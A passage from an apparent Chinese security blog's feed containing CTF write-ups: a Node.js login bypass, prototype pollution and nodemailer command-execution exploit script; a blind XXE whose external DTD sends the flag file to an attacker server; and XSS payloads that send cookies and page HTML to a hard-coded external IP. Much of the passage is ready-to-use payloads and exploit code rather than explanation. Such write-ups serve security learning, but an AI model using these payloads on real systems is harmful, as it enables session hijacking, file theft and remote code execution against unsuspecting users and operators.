<span class="comment">// 字符数组组合成字符串返回</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(resultCharArray);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AntxD^3CTF部分wp</title>
      <link href="2021/03/12/AntxD-3CTF%E9%83%A8%E5%88%86wp/"/>
      <url>2021/03/12/AntxD-3CTF%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h2 id="8-bit-pub"><a href="#8-bit-pub" class="headerlink" title="8-bit pub"></a>8-bit pub</h2><blockquote><p>Try to execute /readflag</p></blockquote><p>Nodejs代码审计</p><ul><li>绕过admin的登陆.</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sql = <span class="built_in">require</span>(<span class="string">&quot;../utils/db.js&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  signup: <span class="function"><span class="keyword">function</span> (<span class="params">username, password, done</span>) </span>&#123;</span><br><span class="line">    # sql.query ...</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  signin: <span class="function"><span class="keyword">function</span> (<span class="params">username, password, done</span>) </span>&#123;</span><br><span class="line">    sql.query(</span><br><span class="line">      <span class="string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>,</span><br><span class="line">      [username, password],</span><br><span class="line">      <span class="function"><span class="keyword">function</span> (<span class="params">err, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="built_in">console</span>.log(<span class="string">&quot;error: &quot;</span>, err);</span><br><span class="line">          <span class="keyword">return</span> done(err, <span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> done(<span class="literal">null</span>, res);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    );</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>比赛的时候看到了占位符就放弃了sql注入,没想到这个可以绕过.</p><p>传json数据即可</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;username&#x27;: &#x27;admin&#x27;,</span><br><span class="line">    &#x27;password&#x27;: </span><br><span class="line">    &#123;</span><br><span class="line">        &#x27;password&#x27;: 1</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sql语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> `password` <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>调用栈:</p><p><img src="image-20210309141346919.png" alt="image-20210309141346919"></p><p>比较关键的几个函数: SqlString.escape</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">SqlString.escape = <span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">val, stringifyObjects, timeZone</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (val === <span class="literal">undefined</span> || val === <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (<span class="keyword">typeof</span> val) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;boolean&#x27;</span>: <span class="keyword">return</span> (val) ? <span class="string">&#x27;true&#x27;</span> : <span class="string">&#x27;false&#x27;</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;number&#x27;</span>: <span class="keyword">return</span> val + <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;object&#x27;</span>:</span><br><span class="line">      <span class="keyword">if</span> (val <span class="keyword">instanceof</span> <span class="built_in">Date</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> SqlString.dateToString(val, timeZone || <span class="string">&#x27;local&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">Array</span>.isArray(val)) &#123;</span><br><span class="line">        <span class="keyword">return</span> SqlString.arrayToList(val, timeZone);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Buffer.isBuffer(val)) &#123;</span><br><span class="line">        <span class="keyword">return</span> SqlString.bufferToString(val);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> val.toSqlString === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">String</span>(val.toSqlString());</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (stringifyObjects) &#123;</span><br><span class="line">        <span class="keyword">return</span> escapeString(val.toString());</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> SqlString.objectToValues(val, timeZone);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">default</span>: <span class="keyword">return</span> escapeString(val);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>SqlString.objectToValues</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">SqlString.objectToValues = <span class="function"><span class="keyword">function</span> <span class="title">objectToValues</span>(<span class="params">object, timeZone</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> sql = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> object) &#123;</span><br><span class="line">    <span class="keyword">var</span> val = object[key];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> val === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sql += (sql.length === <span class="number">0</span> ? <span class="string">&#x27;&#x27;</span> : <span class="string">&#x27;, &#x27;</span>) + SqlString.escapeId(key) + <span class="string">&#x27; = &#x27;</span> + SqlString.escape(val, <span class="literal">true</span>, timeZone);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sql;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>SqlString.escapeId</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">SqlString.escapeId = <span class="function"><span class="keyword">function</span> <span class="title">escapeId</span>(<span class="params">val, forbidQualified</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">Array</span>.isArray(val)) &#123;</span><br><span class="line">    <span class="keyword">var</span> sql = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; val.length; i++) &#123;</span><br><span class="line">      sql += (i === <span class="number">0</span> ? <span class="string">&#x27;&#x27;</span> : <span class="string">&#x27;, &#x27;</span>) + SqlString.escapeId(val[i], forbidQualified);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sql;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (forbidQualified) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;`&#x27;</span> + <span class="built_in">String</span>(val).replace(ID_GLOBAL_REGEXP, <span class="string">&#x27;``&#x27;</span>) + <span class="string">&#x27;`&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;`&#x27;</span> + <span class="built_in">String</span>(val).replace(ID_GLOBAL_REGEXP, <span class="string">&#x27;``&#x27;</span>).replace(QUAL_GLOBAL_REGEXP, <span class="string">&#x27;`.`&#x27;</span>) + <span class="string">&#x27;`&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>json格式数据转化为格式</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`SqlString.escape(key)` = `SqlString.escape(value)`</span><br></pre></td></tr></table></figure><p>这似乎是mysqljs一个组件的问题.</p><ul><li>原型链污染</li></ul><p>很容易可以找到shvl这个库,查看代码发现历史漏洞有原型链污染,但是补丁打的很简陋 (比完赛漏洞好像又修了</p><p><img src="image-20210309141911054.png" alt="image-20210309141911054"></p><p>用constructor.prototype.xx=xx绕过即可</p><ul><li>sendmail读文件</li></ul><p>用path参数或者attachments参数可读文件</p><p>参考 <a href="https://nodemailer.com/message/attachments/">https://nodemailer.com/message/attachments/</a></p><p><img src="image-20210309144402704.png" alt="image-20210309144402704"></p><ul><li>RCE链.</li></ul><p>比赛的时候就只剩下RCE这一步,但是找不到RCE链.</p><p>RCE链的分析 <a href="https://igml.top/2021/03/08/2021-D3CTF/#more">https://igml.top/2021/03/08/2021-D3CTF/#more</a></p><p>赛后发现了nodemailer有一个RCE的历史漏洞,利用的命令执行点和本题相似,不知道出题人是不是根据这个出题目的..  <a href="https://snyk.io/vuln/SNYK-JS-NODEMAILER-1038834">https://snyk.io/vuln/SNYK-JS-NODEMAILER-1038834</a></p><p>顺着上面那个RCE漏洞就不难理解这个链子了</p><p><img src="image-20210309142808577.png" alt="image-20210309142808577"></p><p>因为命令执行代码在SendmailTransport所以需要污染options.sendmail为true.</p><p>然后进入sendmail的send函数,args和path参数为undefined可污染</p><p>存在spawn函数,前面<code>-i</code>参数很容易污染掉,</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">send</span>(<span class="params">mail, done</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// Sendmail strips this header line by itself</span></span><br><span class="line">    mail.message.keepBcc = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> envelope = mail.data.envelope || mail.message.getEnvelope();</span><br><span class="line">    <span class="keyword">let</span> messageId = mail.message.messageId();</span><br><span class="line">    <span class="keyword">let</span> args;</span><br><span class="line">    <span class="keyword">let</span> sendmail;</span><br><span class="line">    <span class="keyword">let</span> returned;</span><br><span class="line">    <span class="keyword">let</span> transform;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> hasInvalidAddresses = []</span><br><span class="line">    .concat(envelope.from || [])</span><br><span class="line">    .concat(envelope.to || [])</span><br><span class="line">    .some(<span class="function"><span class="params">addr</span> =&gt;</span> <span class="regexp">/^-/</span>.test(addr));</span><br><span class="line">    <span class="keyword">if</span> (hasInvalidAddresses) &#123;</span><br><span class="line">        <span class="keyword">return</span> done(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;Can not send mail. Invalid envelope addresses.&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.args) &#123;</span><br><span class="line">        <span class="comment">// force -i to keep single dots</span></span><br><span class="line">        args = [<span class="string">&#x27;-i&#x27;</span>].concat(<span class="built_in">this</span>.args).concat(envelope.to);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        args = [<span class="string">&#x27;-i&#x27;</span>].concat(envelope.from ? [<span class="string">&#x27;-f&#x27;</span>, envelope.from] : []).concat(envelope.to);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// spawn()</span></span><br><span class="line">        sendmail = <span class="built_in">this</span>._spawn(<span class="built_in">this</span>.path, args);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (E) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>调用堆栈</p><p><img src="image-20210309143252281.png" alt="image-20210309143252281"></p><blockquote><p> sh/bash都可以绕过<code>-i</code></p></blockquote><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">base_url = <span class="string">&#x27;http://127.0.0.1:3000&#x27;</span> <span class="comment"># no &#x27;/&#x27; in the end</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">signup_url = <span class="string">f&#x27;<span class="subst">&#123;base_url&#125;</span>/user/signup&#x27;</span></span><br><span class="line">signin_url = <span class="string">f&#x27;<span class="subst">&#123;base_url&#125;</span>/user/signin&#x27;</span></span><br><span class="line">email_url = <span class="string">f&#x27;<span class="subst">&#123;base_url&#125;</span>/admin/email&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_mail</span>(<span class="params">info</span>):</span></span><br><span class="line">    res = session.post(</span><br><span class="line">        url=email_url,</span><br><span class="line">        json=info,</span><br><span class="line">        headers=&#123;</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json; charset=UTF-8&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">    print(<span class="string">&quot;send_mail&quot;</span>+res.text)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    res = session.post(</span><br><span class="line">        url=signin_url,</span><br><span class="line">        json=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: &#123;</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: <span class="number">1</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        headers=&#123;</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json; charset=UTF-8&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">    print(<span class="string">&quot;[*]login&quot;</span> + res.text)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    login()</span><br><span class="line"></span><br><span class="line">    readflag_info=&#123;</span><br><span class="line">        <span class="string">&quot;to&quot;</span>: <span class="string">&quot;4848484848@qq.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;subject&quot;</span>: <span class="string">&quot;read file&quot;</span>,</span><br><span class="line">        <span class="string">&quot;text&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/tmp/l0nm4r&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    getflag_info=&#123;</span><br><span class="line">        <span class="string">&quot;to&quot;</span>: <span class="string">&quot;4848484848@qq.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;subject&quot;</span>: <span class="string">&quot;read file&quot;</span>,</span><br><span class="line">        <span class="string">&quot;constructor.prototype.path&quot;</span>:<span class="string">&quot;sh&quot;</span>,</span><br><span class="line">        <span class="string">&quot;constructor.prototype.sendmail&quot;</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;constructor.prototype.args&quot;</span>:[<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;/readflag&gt;/tmp/l0nm4r&quot;</span>],</span><br><span class="line">        <span class="string">&quot;text&quot;</span>:<span class="string">&quot;hello&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    login()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        send_mail(getflag_info)</span><br><span class="line">        send_mail(readflag_info)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><blockquote><p>注意垃圾邮箱..</p></blockquote><h2 id="real-cloud-storage"><a href="#real-cloud-storage" class="headerlink" title="real_cloud_storage"></a>real_cloud_storage</h2><p>修改endpoint和backet可以把数据包发送到自己服务器</p><p><img src="1.png" alt="img"></p><blockquote><p>可以通过nos-sdk-java找到题目代码 ,</p></blockquote><p>然后收到转发这个包</p><p><img src="image-20210309144703216.png" alt="image-20210309144703216"></p><p>可以发现返回的是xml数据,由此可推测存在xxe. 无回显xxe</p><p>然后利用<a href="https://requestrepo.com/">https://requestrepo.com/</a> 转发流量</p><p>Response修改为: 响应码为403</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;vps&#x2F;ext.dtd&quot;&gt;%xxe;]&gt;</span><br><span class="line">&lt;Error&gt;&lt;Code&gt;SignatureDoesNotMatch&lt;&#x2F;Code&gt;&lt;Message&gt;The request signature we calculated does not match the signature you provided. Check your key and signing method.&lt;&#x2F;Message&gt;&lt;Key&gt;1.png&lt;&#x2F;Key&gt;&lt;BucketName&gt;bucket102638&lt;&#x2F;BucketName&gt;&lt;Resource&gt;&#x2F;bucket102638&#x2F;1.png&lt;&#x2F;Resource&gt;&lt;RequestId&gt;166A963CF7E012F3&lt;&#x2F;RequestId&gt;&lt;HostId&gt;2bc2b0f0-2a36-4af8-b1ad-8bd9ee909d26&lt;&#x2F;HostId&gt;&lt;&#x2F;Error&gt;</span><br></pre></td></tr></table></figure><p>服务器ext.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http:&#x2F;&#x2F;vps&#x2F;?x&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure><p>发送流量</p><p><img src="image-20210309145118177.png" alt="image-20210309145118177"></p><p>返回结果</p><p><img src="image-20210309145027637.png" alt="image-20210309145027637"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFShow-XSS</title>
      <link href="2021/03/12/CTFSHOW-XSS/"/>
      <url>2021/03/12/CTFSHOW-XSS/</url>
      
        <content type="html"><![CDATA[<h2 id="web316-反弹cookie到vps"><a href="#web316-反弹cookie到vps" class="headerlink" title="web316 反弹cookie到vps"></a>web316 反弹cookie到vps</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">&quot;img&quot;</span>);img.src = <span class="string">&quot;http://91.67.253.121:1234/?cookie=&quot;</span>+<span class="built_in">document</span>.cookie;alert(<span class="regexp">/success/</span>);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;<span class="built_in">window</span>.open(<span class="string">&#x27;http://91.67.253.121:1237/?cookie=&#x27;</span>+<span class="built_in">document</span>.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="1612952403326.png" alt="1612952403326"></p><h2 id="web317-319-新姿势"><a href="#web317-319-新姿势" class="headerlink" title="web317-319 新姿势"></a>web317-319 新姿势</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">BODY</span> <span class="attr">ONLOAD</span>=<span class="string">document.location</span>=<span class="string">&#x27;http://91.67.253.121:1237?cookie=&#x27;</span>+<span class="attr">document.cookie</span>;&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web320-过滤空格"><a href="#web320-过滤空格" class="headerlink" title="web320 过滤空格"></a>web320 过滤空格</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;BODY/ONLOAD=document.location=&#x27;http://91.67.253.121:1237?cookie=&#x27;+document.cookie;&gt;</span><br></pre></td></tr></table></figure><h2 id="328"><a href="#328" class="headerlink" title="328"></a>328</h2><p>用户名存在xss</p><p>找了几个xss平台好像都没什么用</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://91.67.253.121:1237/1.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>1.js</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var img = new Image();</span><br><span class="line">img.src = &quot;http://91.67.253.121:1237/?cookie=&quot;+document.cookie;</span><br><span class="line">document.body.append(img);</span><br></pre></td></tr></table></figure><h2 id="329"><a href="#329" class="headerlink" title="329"></a>329</h2><p>1.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src = <span class="string">&quot;http://91.67.253.121:1237/?cookie=&quot;</span>+<span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;html&#x27;</span>)[<span class="number">0</span>].innerHTML;</span><br><span class="line"><span class="built_in">document</span>.body.append(img);</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://91.67.253.121:1237/1.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>会把整个html返回,然后找到flag</p><p><img src="1613011316572.png" alt="1613011316572"></p><h2 id="332"><a href="#332" class="headerlink" title="332"></a>332</h2><p><img src="1612972060218.png" alt="1612972060218"></p><h2 id="333"><a href="#333" class="headerlink" title="333"></a>333</h2><p>自己给自己转账,burp跑</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过一道题了解PaddingOracleAttack&amp;&amp;CBC-Byte-Flipping-Attack</title>
      <link href="2021/02/23/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E4%BA%86%E8%A7%A3PaddingOracleAttack&amp;&amp;CBC-Byte-Flipping-Attack/"/>
      <url>2021/02/23/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E4%BA%86%E8%A7%A3PaddingOracleAttack&amp;&amp;CBC-Byte-Flipping-Attack/</url>
      
